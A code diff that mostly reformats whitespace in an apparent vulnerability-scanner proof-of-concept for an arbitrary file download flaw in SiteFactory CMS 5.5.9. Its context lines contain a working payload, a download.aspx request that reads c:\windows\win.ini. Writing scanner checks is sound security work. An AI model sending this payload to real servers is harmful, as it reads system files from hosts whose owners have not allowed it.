@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'SiteFactoryCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'SiteFactoryCMS_0001'  # 平台漏洞编号，留空
     name = 'SiteFactory CMS任意文件下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_DOWNLOAD # 漏洞类型
+    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
     disclosure_date = '2015-09-06'  # 漏洞公布时间
     desc = '''
         SiteFactory CMS 5.5.9 存在任意文件下载漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'SiteFactoryCMS'  # 漏洞应用名称
     product_version = '5.5.9'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = 'e7fc85db-78d1-4b1f-bc3e-1d40e6b76a83'
@@ -30,11 +32,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/sitefactory/assets/download.aspx?file=c%3a\windows\win.ini'
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            
+
             if req.status_code == 200 and '[mci extensions]' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -44,6 +46,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
